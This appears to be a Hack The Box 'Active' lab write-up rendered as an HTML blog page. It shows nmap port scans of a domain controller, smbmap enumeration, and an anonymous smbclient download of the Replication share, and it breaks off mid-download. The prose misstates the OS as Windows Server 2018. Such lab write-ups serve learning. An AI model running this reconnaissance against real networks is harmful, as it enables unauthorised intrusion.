@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Enil ">
+<meta name="description" content="Initial Reconnaissace Nmap Port Scan ┌──(kali㉿kali)-[~/Work/Kali/Active] └─$ sudo nmap --min-rate 10000 -p- 10.129.18.244 -oA ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 20:56 -0400 Warning: 10.129.18.244 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.18.244 Host is up (0.12s latency). Not shown: 65506 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1139/tcp filtered cce3x 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5722/tcp open msdfsr 9389/tcp open adws 10489/tcp filtered unknown 28021/tcp filtered unknown 32539/tcp filtered unknown 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown 49170/tcp open unknown 49173/tcp open unknown 56367/tcp filtered unknown 57964/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds Extracting the ports for later use。
+" />
+<meta name="keywords" content=", Hack, Writeup, HTB" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/english-articles/htb-active-writeup/" />
+
+
+    <title>
+        
+            HTB-Active Writeup :: Welcome My Hack&#39;s Blog 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.ab5336003ba331300318b49292c672210905baf1ef5410a739f647e70c8808fa.css" integrity="sha256-q1M2ADujMTADGLSSksZyIQkFuvHvVBCnOfZH5wyICPo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="HTB-Active Writeup">
+  <meta itemprop="description" content="Initial Reconnaissace Nmap Port Scan ┌──(kali㉿kali)-[~/Work/Kali/Active] └─$ sudo nmap --min-rate 10000 -p- 10.129.18.244 -oA ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 20:56 -0400 Warning: 10.129.18.244 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.18.244 Host is up (0.12s latency). Not shown: 65506 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1139/tcp filtered cce3x 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5722/tcp open msdfsr 9389/tcp open adws 10489/tcp filtered unknown 28021/tcp filtered unknown 32539/tcp filtered unknown 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown 49170/tcp open unknown 49173/tcp open unknown 56367/tcp filtered unknown 57964/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds Extracting the ports for later use。">
+  <meta itemprop="datePublished" content="2026-04-14T08:00:00+08:00">
+  <meta itemprop="dateModified" content="2026-04-14T08:00:00+08:00">
+  <meta itemprop="wordCount" content="2582">
+  <meta itemprop="keywords" content="Hack,Writeup,HTB">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB-Active Writeup">
+  <meta name="twitter:description" content="Initial Reconnaissace Nmap Port Scan ┌──(kali㉿kali)-[~/Work/Kali/Active] └─$ sudo nmap --min-rate 10000 -p- 10.129.18.244 -oA ports [sudo] password for kali: Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 20:56 -0400 Warning: 10.129.18.244 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.18.244 Host is up (0.12s latency). Not shown: 65506 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1139/tcp filtered cce3x 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5722/tcp open msdfsr 9389/tcp open adws 10489/tcp filtered unknown 28021/tcp filtered unknown 32539/tcp filtered unknown 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown 49170/tcp open unknown 49173/tcp open unknown 56367/tcp filtered unknown 57964/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds Extracting the ports for later use。">
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2026-04-14 08:00:00 &#43;0800 CST" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/english-articles/">English Articles</a></li><li><a href="/long-articles/">长文章</a></li><li><a href="/posts/">文章</a></li><li><a href="/tags/">标签</a></li><li><a href="/tools/">工具专区</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://localhost:1313/english-articles/htb-active-writeup/">HTB-Active Writeup</a></h2>
+
+            
+            
+            
+                <hr />
+                <aside id="toc">
+                <div class="toc-title">Table of Contents</div>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-reconnaissace">Initial Reconnaissace</a>
+      <ul>
+        <li><a href="#nmap-port-scan">Nmap Port Scan</a></li>
+        <li><a href="#nmap-detailed-scan">Nmap Detailed Scan</a></li>
+      </ul>
+    </li>
+    <li><a href="#smb-exploitation">SMB Exploitation</a></li>
+    <li><a href="#obtaining-the-user-flag">Obtaining the User flag</a></li>
+    <li><a href="#obstaining--administrator-access">Obstaining  Administrator Access</a></li>
+  </ul>
+</nav>
+                </aside>
+                <hr />
+            
+
+            <div class="post-content">
+                <h2 id="initial-reconnaissace">Initial Reconnaissace</h2>
+<h3 id="nmap-port-scan">Nmap Port Scan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>                                                     
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.18.244 -oA ports                                                                                                                          
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:                                                                                                                                                           
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-04-13 20:56 -0400                                                                                                                   
+</span></span><span style="display:flex;"><span>Warning: 10.129.18.244 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.18.244
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65506</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE    SERVICE
+</span></span><span style="display:flex;"><span>53/tcp    open     domain
+</span></span><span style="display:flex;"><span>88/tcp    open     kerberos-sec
+</span></span><span style="display:flex;"><span>135/tcp   open     msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open     netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open     ldap
+</span></span><span style="display:flex;"><span>445/tcp   open     microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp   open     kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp   open     http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp   open     ldapssl
+</span></span><span style="display:flex;"><span>1139/tcp  filtered cce3x
+</span></span><span style="display:flex;"><span>3268/tcp  open     globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp  open     globalcatLDAPssl
+</span></span><span style="display:flex;"><span>5722/tcp  open     msdfsr
+</span></span><span style="display:flex;"><span>9389/tcp  open     adws
+</span></span><span style="display:flex;"><span>10489/tcp filtered unknown
+</span></span><span style="display:flex;"><span>28021/tcp filtered unknown
+</span></span><span style="display:flex;"><span>32539/tcp filtered unknown
+</span></span><span style="display:flex;"><span>47001/tcp open     winrm
+</span></span><span style="display:flex;"><span>49152/tcp open     unknown
+</span></span><span style="display:flex;"><span>49153/tcp open     unknown
+</span></span><span style="display:flex;"><span>49154/tcp open     unknown
+</span></span><span style="display:flex;"><span>49155/tcp open     unknown
+</span></span><span style="display:flex;"><span>49157/tcp open     unknown
+</span></span><span style="display:flex;"><span>49158/tcp open     unknown
+</span></span><span style="display:flex;"><span>49165/tcp open     unknown
+</span></span><span style="display:flex;"><span>49170/tcp open     unknown
+</span></span><span style="display:flex;"><span>49173/tcp open     unknown
+</span></span><span style="display:flex;"><span>56367/tcp filtered unknown
+</span></span><span style="display:flex;"><span>57964/tcp filtered unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 17.63 seconds
+</span></span></code></pre></div><p>Extracting the ports for later use。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ grep open ports.nmap | awk -F <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#e6db74">&#39;{print $1}&#39;</span> | paste -sd <span style="color:#e6db74">&#39;,&#39;</span> 
+</span></span><span style="display:flex;"><span>53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49170,49173
+</span></span></code></pre></div><h3 id="nmap-detailed-scan">Nmap Detailed Scan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49170,49173 10.129.18.244
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-04-13 20:58 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.18.244
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| dns-nsid: 
+</span></span><span style="display:flex;"><span>|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>88/tcp    open  tcpwrapped
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5722/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49158/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49165/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49170/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49173/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Microsoft Windows 2008|7|Vista|8.1
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
+</span></span><span style="display:flex;"><span>OS details: Microsoft Windows Vista SP2 or Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2026-04-14T00:59:45
+</span></span><span style="display:flex;"><span>|_  start_date: 2026-04-14T00:34:20
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2.1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 77.35 seconds
+</span></span></code></pre></div><p>According to the Nmap scan results, the target machine is running <code>Windows Server 2018 R2SP1</code> and is a domain controller, name is <code>active.htb</code>, and the hostname is <code>DC</code>.</p>
+<p>Adding the domain name to the <code>hosts</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo bash -c <span style="color:#e6db74">&#39;echo &#34;10.129.18.244 active.htb&#34; &gt;&gt; /etc/hosts&#39;</span>                                                           
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tail -n <span style="color:#ae81ff">1</span> /etc/hosts
+</span></span><span style="display:flex;"><span>10.129.18.244 active.htb
+</span></span></code></pre></div><h2 id="smb-exploitation">SMB Exploitation</h2>
+<p>Machine has ports 139 and 445 open, indicating SMB services. Executing <code>smbmap</code> scan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>                                                                                                                                                              
+</span></span><span style="display:flex;"><span>└─$ smbmap -H active.htb                                                                                                                                                                          
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>    ________  ___      ___  _______   ___      ___       __         _______                                                                                                                       
+</span></span><span style="display:flex;"><span>   /<span style="color:#e6db74">&#34;       )|&#34;</span>  <span style="color:#ae81ff">\ </span>   /<span style="color:#e6db74">&#34;  ||   _  &#34;</span><span style="color:#ae81ff">\ </span>|<span style="color:#e6db74">&#34;  \    /&#34;</span>  |     /<span style="color:#e6db74">&#34;&#34;</span><span style="color:#ae81ff">\ </span>      |   __ <span style="color:#e6db74">&#34;\                                                                                                                      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)                                                                                                                     
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#39; /\  \     |:  ____/                                                                                                                      
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#39;  \    (|  /                                                                                                                          
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /&#34;</span> <span style="color:#ae81ff">\ </span>  :<span style="color:#f92672">)</span> |.  <span style="color:#ae81ff">\ </span>   /:  <span style="color:#f92672">||</span>: |_<span style="color:#f92672">)</span>  :<span style="color:#f92672">)</span>|.  <span style="color:#ae81ff">\ </span>   /:  | /   /  <span style="color:#ae81ff">\ </span>  <span style="color:#ae81ff">\ </span> /|__/ <span style="color:#ae81ff">\ </span>                                                                                                                        
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_______/  |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>_______/ |___|<span style="color:#ae81ff">\_</span>_/|___|<span style="color:#f92672">(</span>___/    <span style="color:#ae81ff">\_</span>__<span style="color:#f92672">)(</span>_______<span style="color:#f92672">)</span>                                                                                                                        
+</span></span><span style="display:flex;"><span>-----------------------------------------------------------------------------                                                                                                                     
+</span></span><span style="display:flex;"><span>SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com                                                                                                                     
+</span></span><span style="display:flex;"><span>                     https://github.com/ShawnDEvans/smbmap                                                                                                                                        
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Detected <span style="color:#ae81ff">1</span> hosts serving SMB                                                                                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Established <span style="color:#ae81ff">1</span> SMB connections<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">1</span> authenticated session<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                                                                                                                               
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.129.18.244:445       Name: active.htb                Status: Authenticated                                                                                                             
+</span></span><span style="display:flex;"><span>        Disk                                                    Permissions     Comment                                                                                                           
+</span></span><span style="display:flex;"><span>        ----                                                    -----------     -------                                                                                                           
+</span></span><span style="display:flex;"><span>        ADMIN$                                                  NO ACCESS       Remote Admin                                                                                                      
+</span></span><span style="display:flex;"><span>        C$                                                      NO ACCESS       Default share                                                                                                     
+</span></span><span style="display:flex;"><span>        IPC$                                                    NO ACCESS       Remote IPC                                                                                                        
+</span></span><span style="display:flex;"><span>        NETLOGON                                                NO ACCESS       Logon server share                                                                                                
+</span></span><span style="display:flex;"><span>        Replication                                             READ ONLY                                                                                                                         
+</span></span><span style="display:flex;"><span>        SYSVOL                                                  NO ACCESS       Logon server share                                                                                                
+</span></span><span style="display:flex;"><span>        Users                                                   NO ACCESS                                                                                                                         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Closed <span style="color:#ae81ff">1</span> connections 
+</span></span></code></pre></div><p>Discovered a <code>READ ONLY</code> shared directory named <code>Replication</code>, Using <code>smbclient</code> recheck.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient -L active.htb -N 
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>        C$              Disk      Default share
+</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share 
+</span></span><span style="display:flex;"><span>        Replication     Disk      
+</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share 
+</span></span><span style="display:flex;"><span>        Users           Disk      
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span>do_connect: Connection to active.htb failed <span style="color:#f92672">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>Connecting to <code>Replication</code>, downloading all its files to Kali.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Active/Smb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient //active.htb/Replication -N
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> recurse ON
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> prompt off
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> mget *
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>PT.INI of size <span style="color:#ae81ff">23</span> as active.htb/Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/GPT.INI <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>PT.INI of size <span style="color:#ae81ff">22</span> as active.htb/Policies/<span style="color:#f92672">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span style="color:#f92672">}</span>/GPT.INI <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.0 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>roup Policy<span style="color:#ae81ff">\G</span>PE.INI of size <span style="color:#ae81ff">119</span> as active.htb/Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/Group Policy/GPE.INI <span style="color:#f92672">(</span>0.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\M</span>ACHINE<span style="color:#ae81ff">\R</span>egistry.pol of size <span style="color:#ae81ff">2788</span> as active.htb/Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Registry.pol <span style="color:#f92672">(</span>6.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.6 KiloBytes/sec<span style="color:#f92672">)</span>
